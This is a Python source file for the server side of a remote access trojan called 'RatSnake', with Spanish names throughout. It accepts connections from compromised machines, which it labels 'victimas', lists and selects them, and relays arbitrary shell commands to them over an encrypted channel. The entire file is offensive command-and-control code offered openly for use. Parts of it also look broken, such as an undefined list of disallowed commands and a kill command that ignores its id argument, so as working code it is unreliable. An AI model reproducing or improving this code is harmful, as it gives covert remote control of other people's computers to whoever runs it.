import socket
import threading
from components.criptografia import cifrar, descifrar, gen_key

class Servidor(threading.Thread):

    victimas = {}
    no_victima = 1
    victima_actual = None
    
    def __init__(self, port):
        super(Servidor, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)
        print(f"El servidor RatSnake se encuentra escuchando coneciones por el puerto {port}.\n")
    
    def run(self):
        while True:
            conn, addr = self.s.accept()
            key = gen_key()
            try:
                plataforma = descifrar(conn.recv(4096), key).decode('utf-8')
            except Exception as e:
                print(f'[-Error-] {str(e)}')
            victima_id = self.no_victima
            victima = ConexionVictima(conn, key, addr, plataforma, victima_id)
            self.victimas[victima_id] = victima
            self.no_victima += 1
            print(f'Victima {victima_id} conectada.\r')
    
    def rs_help(self, _):
        print("""
        Comando       | Descripcion
        ----------------------------------------------------------------------------
        exit          | Cerrar el servidor manteniendo las victimas activas.
        help          | Muestra esta ayuda.
        help_victima  | Muestra los comandos que se pueden ejecutar en la victima.
        kill <id>     | Cerrar la conexión con una victima.
        quit          | Cerrar el servidor manteniendo las victimas activas.
        victima <id>  | Conectar con una victima
        victimas      | Listar las victimas conectadas.
        """)
    
    def rs_quit(self, force):
        if force == '-f':
            for _, v in self.victimas.items():
                self.env_victima('quit', v)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            exit(0)

        elif input("[*] Seguro que desea cerrar el servidor y manter las victimas activas (y/N)? ").lower().startswith('y'):
            for _, v in self.victimas.items():
                self.env_victima('quit', v)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            exit(0)

    def listar_victimas(self, _):
        print("""
----------------------------------------
  ID |     IP Address    |  Plataforma
----------------------------------------""")
        for i, v in self.victimas.items():
            print(f'  {i}  |  {v.addr[0]}  | {v.plataforma}\n----------------------------------------')
    
    def sel_victima(self, victima_id):
        try:
            self.victima_actual = self.victimas[int(victima_id)]
            print(f'Se ha seleccionado la victima {self.victima_actual.addr[0]} con plataforma {self.victima_actual.plataforma}')
        except (KeyError, ValueError):
            if not victima_id and self.victima_actual:
                print(f'Victima actual {self.victima_actual.addr[0]} - {self.victima_actual.plataforma}')
            else:
                print('[-Error-] ID de la victima invalido.')

    def env_victima(self, message, victima):
        #print(f'Se envio a {victima.addr[0]} el comando {message}')
        try:
            victima.conn.send(cifrar(bytes(message, 'utf-8'), victima.key))
        except Exception as e:
            print(f'[-Error-] {str(e)}')
    
    def rec_victima(self, victima):
        #print(f'La victima {victima.addr[0]} respondio...')
        try:
            data = descifrar(victima.conn.recv(4096), victima.key).decode('utf-8')
            print(data)
        except Exception as e:
            print(f'[-Error-] {str(e)}')

    def ejecutar_comando(self, comando, victima_actual):
        self.env_victima(comando, victima_actual)
        self.rec_victima(victima_actual)

    def victima_help(self, _):
        self.ejecutar_comando('help', self.victima_actual)

    def info(self, _):
        print(f'ID Victima: {self.victima_actual.uid}')
        self.ejecutar_comando('info', self.victima_actual)
        print()
    
    def kill_victima(self, _):
        self.victima_actual.conn.close()
        self.victimas.pop(self.victima_actual.uid, None)
        self.victima_actual = None

    def runShell(self):
        comandos = {
            'exit'  : self.rs_quit,
            'help'  : self.rs_help,
            'help_victima'  : self.victima_help,
            'kill'  : self.kill_victima,
            'quit'  : self.rs_quit,
            'victima'   : self.sel_victima,
            'victimas'  : self.listar_victimas,
            'info'  : self.info,
        }
        while True:
            self.usuario = self.victima_actual.addr[0] if self.victima_actual else 'server'
            shell = input(f'{self.usuario}@RatSnake$ ')
            if not shell:
                continue
            cmd, _, script = shell.partition(' ')
            if cmd in comandos:
                comandos[cmd](script)
            elif cmd in comandos_no_permitidos:
                print(f'El comando {cmd} no se puede emplear.')
            elif self.usuario == 'server':
                print('[-Error-] No se encuentra conectado a nunguna victima.')
                continue
            else:
                self.ejecutar_comando(shell, self.victima_actual)


class ConexionVictima:
    def __init__(self, conn, key, addr, plataforma, uid=0):
        self.conn = conn
        self.key = key
        self.addr = addr
        self.plataforma = plataforma
        self.uid = uid